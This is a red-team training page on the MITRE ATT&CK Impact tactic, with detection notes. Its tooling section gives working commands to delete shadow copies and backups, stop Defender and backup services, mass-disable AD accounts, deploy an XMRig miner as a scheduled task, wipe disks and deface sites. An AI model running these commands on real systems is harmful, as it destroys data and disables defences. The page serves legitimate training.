---
layout: training-page
title: "TA0040 — Impact — Red Team Academy"
module: "MITRE ATT&CK Tactics"
tags:
  - mitre
  - att&ck
  - impact
  - ransomware
  - data-destruction
  - denial-of-service
page_key: "mitre-ta0040"
render_with_liquid: false
---

# TA0040 — Impact

Impact techniques represent the adversary's final objective: manipulating, disrupting, or destroying systems and data. Unlike other tactics focused on stealth, Impact is often deliberately visible — ransomware announces itself, DDoS attacks are obvious, and wipers are designed to cause maximum damage. Threat actors in this phase have typically completed their primary mission objectives (credential theft, espionage, data theft) and are now executing a disruptive or destructive final payload.

In red team engagements, Impact simulation must be handled carefully — never execute actual ransomware or destructive commands in production. Use approved simulation frameworks (OpenBAS, Atomic Red Team) to test detection without causing damage.

## Key Techniques

| T-ID | Technique | Sub-technique | Notes |
|------|-----------|---------------|-------|
| T1531 | Account Access Removal | — | Lock out domain accounts during incident chaos |
| T1485 | Data Destruction | — | Delete files, overwrite with zeros, shred |
| T1486 | Data Encrypted for Impact | — | Ransomware — AES encrypt files, demand ransom |
| T1565 | Data Manipulation | T1565.001 Stored Data Manipulation | Modify database records, corrupt files |
| T1565 | Data Manipulation | T1565.002 Transmitted Data Manipulation | MitM — alter data in transit |
| T1565 | Data Manipulation | T1565.003 Runtime Data Manipulation | Intercept and modify memory at runtime |
| T1491 | Defacement | T1491.001 Internal Defacement | Replace internal web content |
| T1491 | Defacement | T1491.002 External Defacement | Deface public-facing website |
| T1561 | Disk Wipe | T1561.001 Disk Content Wipe | Zero-fill all data on disk |
| T1561 | Disk Wipe | T1561.002 Disk Structure Wipe | Overwrite MBR/VBR/partition table |
| T1499 | Endpoint Denial of Service | T1499.001 OS Exhaustion Flood | CPU/memory exhaustion |
| T1499 | Endpoint Denial of Service | T1499.002 Service Exhaustion Flood | Exhaust connection pools |
| T1499 | Endpoint Denial of Service | T1499.003 Application Exhaustion Flood | Max out app-layer resources |
| T1657 | Financial Theft | — | BEC, fraudulent wire transfers |
| T1495 | Firmware Corruption | — | Overwrite UEFI/BIOS to brick device |
| T1490 | Inhibit System Recovery | — | Delete VSS, disable recovery options |
| T1498 | Network Denial of Service | T1498.001 Direct Network Flood | Volumetric DDoS |
| T1498 | Network Denial of Service | T1498.002 Reflection Amplification | DNS/NTP/memcached amplification |
| T1496 | Resource Hijacking | — | Cryptomining (XMRig) — slow degradation |
| T1489 | Service Stop | — | Stop critical services (DB, AV, backup) |
| T1529 | System Shutdown/Reboot | — | Forced reboot mid-operation, disruptive |

## Red Team Tooling

### Inhibit System Recovery (Pre-Ransomware)

```
# Delete Volume Shadow Copies (VSS) — removes file restore capability
vssadmin delete shadows /all /quiet

# Disable Windows Recovery Mode
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures

# Delete Windows Backup Catalog
wbadmin DELETE CATALOG -quiet

# Disable System Restore Points
Disable-ComputerRestore -Drive "C:\"

# All-in-one (common ransomware pre-encryption sequence):
cmd /c "vssadmin delete shadows /all /quiet & bcdedit /set {default} recoveryenabled no & wbadmin DELETE CATALOG -quiet"
```

### Service Stop (Disable Defenses Before Ransomware)

```
# Stop Windows Defender real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true
Stop-Service WinDefend -Force

# Stop backup and AV services
net stop "Backup Exec Agent Accelerator and Remote Agent"
net stop "Veeam Backup Catalog Data Service"
net stop MBAMService
net stop Sophos

# One-liner stop list (common ransomware behavior)
$services = @("MBAMService","Sophos","MfeEPCfg","MSSQLSERVER","SQLSERVERAGENT","MySQL")
foreach ($svc in $services) { Stop-Service $svc -Force -ErrorAction SilentlyContinue }
```

### Account Lockout (Lock Out Defenders)

```
# Disable all non-admin domain user accounts
Get-ADUser -Filter {Enabled -eq $true} | Where-Object {
    $_.MemberOf -notcontains "Domain Admins"
} | Disable-ADAccount

# Change local admin password on all hosts (via CrackMapExec)
cme smb 10.10.10.0/24 -u Administrator -p 'OldPass' \
  -M set_smbv1 -o COMMAND="net user Administrator NewPassword"

# Reset krbtgt password twice (invalidate all Kerberos tickets)
Set-ADAccountPassword -Identity "krbtgt" -Reset -NewPassword (ConvertTo-SecureString "NewKrbtgtPass" -AsPlainText -Force)
```

### Ransomware Simulation (Testing Only — Do NOT Use In Production)

```
# OpenBAS — CACAO-based breach and attack simulation platform
# Deploy OpenBAS agent on test host, execute ransomware scenario:
./openBAS agent --payload ransomware-simulation --target TEST_HOST

# Atomic Red Team — test ransomware behaviors without actual encryption
Invoke-AtomicTest T1486   # test data encryption indicators
Invoke-AtomicTest T1490   # test recovery inhibition indicators

# Python script — create encrypted dummy files (safe simulation)
python3 -c "
import os, random
for i in range(100):
    with open(f'ENCRYPTED_{i}.locked','wb') as f:
        f.write(os.urandom(4096))
"
```

### Resource Hijacking (Cryptomining)

```
# XMRig — CPU cryptocurrency miner (often deployed as persistent payload)
xmrig.exe -o pool.minexmr.com:443 -u WALLET_ADDRESS -p x --tls

# Deployment via scheduled task (common cryptominer persistence)
schtasks /create /tn "WindowsHelper" \
  /tr "C:\Windows\Temp\xmrig.exe -o pool.minexmr.com:443 -u WALLET -p x --tls" \
  /sc ONSTART /ru SYSTEM /f
```

### Disk Wipe (Testing Only — Irreversible)

```
# SIMULATION ONLY — never run on production systems

# SDelete (Sysinternals) — secure file overwrite
sdelete64.exe -accepteula -z C:\    # zero free space (slow)
sdelete64.exe -accepteula -s C:\Windows\Temp\target_dir\   # recursive delete

# Linux shred — overwrite files with random data
shred -vzn 3 /tmp/sensitive_file    # 3-pass overwrite + verbose
find /tmp/staging/ -type f -exec shred -vz {} \;

# MBR overwrite (DESTRUCTIVE — do not run in engagement)
# dd if=/dev/zero of=/dev/sda bs=446 count=1   # NEVER RUN THIS
```

### Defacement

```
# Internal web server defacement (requires write access)
echo '<h1>PWNED by Red Team</h1>' > C:\inetpub\wwwroot\index.html
cp /var/www/html/index.html /var/www/html/index.html.bak
echo '<html><body><h1>You have been compromised.</h1></body></html>' > /var/www/html/index.html

# Database manipulation (test impact on data integrity)
sqlcmd -S TARGET_SQL -Q "UPDATE Products SET Price = 0.01 WHERE CategoryID = 1"
```

## Detection Notes

- **VSS deletion**: Event ID 524 (Backup Catalog was deleted), Security Event 8224 (VSS service stopped); Sysmon Event 1 — vssadmin.exe with "delete shadows" arguments
- **Service stops**: Event ID 7036 (service stopped) — watch for critical security services (AV, backup, SIEM agent) stopping in rapid succession
- **Account lockout**: Event ID 4725 (user account disabled), 4740 (account locked out); bulk account changes from single admin account is a strong indicator
- **File encryption activity**: high CPU, rapid file modification (Event 4663 — file changed) across many file types, file renaming with new extension — EDR behavioral signatures catch this pattern even without ransomware signatures
- **Cryptomining**: CPU utilization spikes to near 100% from unusual process; network connections to mining pool IPs/domains (blocklists available); XMRig signature known to all major AV
- **MBR modification**: Sysmon Event 9 (raw disk access) on \\.\PhysicalDrive0 from non-bootloader process — most EDRs alert on this

## Related Academy Pages

- [Anti-Forensics & Evidence Cleanup](/post-exploitation/anti-forensics/)
- [Purple Team Overview](/purple-team/overview/)
- [Tabletop Exercises](/purple-team/tabletop-exercises/)
- [Threat Hunting Playbooks](/purple-team/threat-hunting/)
- [ATT&CK Coverage Mapping](/purple-team/attack-coverage-mapping/)

## Resources

- [TA0040 — MITRE ATT&CK Impact](https://attack.mitre.org/tactics/TA0040/)
- [T1486 — Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)
- [T1490 — Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)
- [OpenBAS — Open Breach & Attack Simulation](https://github.com/OpenBAS-Platform/openbas)
